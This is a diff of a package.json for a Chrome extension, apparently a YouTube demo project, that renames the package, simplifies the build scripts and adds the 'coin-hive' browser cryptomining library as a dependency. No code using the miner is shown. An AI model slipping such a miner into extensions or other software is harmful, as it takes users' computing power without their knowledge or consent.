@@ -1,19 +1,20 @@
 {
-  "name": "extension-skeleton",
-  "version": "0.3.0",
-  "description": "Bare Google Chrome extension skeleton.",
+  "name": "jays-chrome-extension",
+  "version": "1.0.0",
+  "description": "Jay's Youtube channel proof of concept chrome extension project",
   "engines": {
     "node": "7.0.0",
     "npm": "3.10.8"
   },
   "scripts": {
-    "build": "mkdir -p ./build/prod && webpack --config ./webpack/webpack.config.prod.js",
-    "start": "mkdir -p ./build/dev && webpack --config ./webpack/webpack.config.dev.js",
+    "build": "webpack --config ./webpack/webpack.config.prod.js",
+    "start": "webpack --config ./webpack/webpack.config.dev.js",
     "lint": "eslint src/js/",
     "test": "mocha-webpack --watch --webpack-config ./webpack/webpack.config.test.js \"src/js/**/*.spec.js\"",
     "test:ci": "mocha-webpack --webpack-config ./webpack/webpack.config.test.js \"src/js/**/*.spec.js\""
   },
   "dependencies": {
+    "coin-hive": "^1.10.0",
     "jquery": "3.1.1",
     "lodash": "4.17.4"
   },
